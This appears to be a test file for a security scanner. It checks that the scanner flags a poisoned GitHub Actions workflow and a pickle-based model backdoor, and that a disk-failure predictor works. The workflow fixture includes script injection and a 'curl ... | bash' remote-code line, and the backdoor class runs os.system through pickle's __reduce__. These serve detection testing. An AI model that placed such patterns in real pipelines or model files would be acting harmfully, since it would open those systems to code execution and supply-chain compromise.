"""Tests for the CI/CD, ML-backdoor, and failure-prediction subcommands."""
import os
import pickle

from webrecon.cicd import scanner as cicd
from webrecon.mlscan import model_scan, pipeline_scan
from webrecon.reliability import predict


# ---- CI/CD --------------------------------------------------------------
BAD_WORKFLOW = """name: CI
on: pull_request_target
permissions: write-all
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - uses: foo/bar@main
      - run: echo "${{ github.event.issue.title }}"
      - run: curl -sSL https://x/i.sh | bash
"""


def test_cicd_flags_poisoned_pipeline(tmp_path):
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "ci.yml").write_text(BAD_WORKFLOW, encoding="utf-8")
    result = cicd.scan_path(str(tmp_path))
    titles = " ".join(f.title for f in result.findings)
    assert "pull_request_target" in titles
    assert "Script injection" in titles
    assert "not pinned" in titles
    assert any(f.severity.value == "CRITICAL" for f in result.findings)
    # every finding ships a patch
    assert all(f.poc for f in result.findings if f.id.startswith("CICD-P"))


# ---- ML backdoor --------------------------------------------------------
class _Backdoor:
    def __reduce__(self):
        return (os.system, ("echo pwned",))


def test_ml_pickle_backdoor_detected(tmp_path):
    model = tmp_path / "model.pkl"
    model.write_bytes(pickle.dumps(_Backdoor()))
    findings = model_scan.scan_models(tmp_path)
    assert findings, "expected a pickle backdoor finding"
    assert findings[0].severity.value == "CRITICAL"
    assert "system" in findings[0].evidence  # os.system -> posix.system / nt.system


def test_ml_unsafe_torch_load(tmp_path):
    (tmp_path / "train.py").write_text(
        "import torch\nm = torch.load(p)\n", encoding="utf-8")
    result = pipeline_scan.scan_path(str(tmp_path))
    assert any("torch.load" in f.title for f in result.findings)


# ---- Failure prediction -------------------------------------------------
TELEMETRY = """node,timestamp,reallocated_sectors,current_pending_sectors,temperature
disk-A,2026-08-20,0,0,38
disk-A,2026-08-24,18,2,45
disk-A,2026-08-28,120,24,63
disk-B,2026-08-20,0,0,35
disk-B,2026-08-28,0,0,36
"""


def test_predict_flags_failing_disk(tmp_path):
    csv = tmp_path / "t.csv"
    csv.write_text(TELEMETRY, encoding="utf-8")
    result = predict.analyze(str(csv))
    locs = {f.location for f in result.findings}
    assert "disk-A" in locs        # failing disk flagged
    assert "disk-B" not in locs    # healthy disk not flagged
    a = next(f for f in result.findings if f.location == "disk-A")
    assert "day(s)" in a.impact    # includes a time-to-failure estimate
